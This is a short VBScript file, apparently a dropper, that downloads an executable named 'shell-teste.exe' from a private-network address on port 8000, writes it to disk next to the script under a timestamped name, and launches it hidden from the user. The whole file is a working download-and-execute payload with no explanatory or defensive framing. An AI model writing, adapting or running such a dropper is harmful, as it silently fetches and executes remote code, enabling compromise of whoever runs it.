Set fso  = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("MSXML2.XMLHTTP")
folder = fso.GetParentFolderName(WScript.ScriptFullName)
path = folder & "\st" & CLng(Timer() * 1000) & ".exe"
http.Open "GET", "http://172.31.141.15:8000/shell-teste.exe", False
http.Send
Set st = CreateObject("ADODB.Stream")
st.Type = 1
st.Open
st.Write http.ResponseBody
st.SaveToFile path, 2
st.Close
Set sh = CreateObject("WScript.Shell")
sh.Run """" & path & """", 0, False
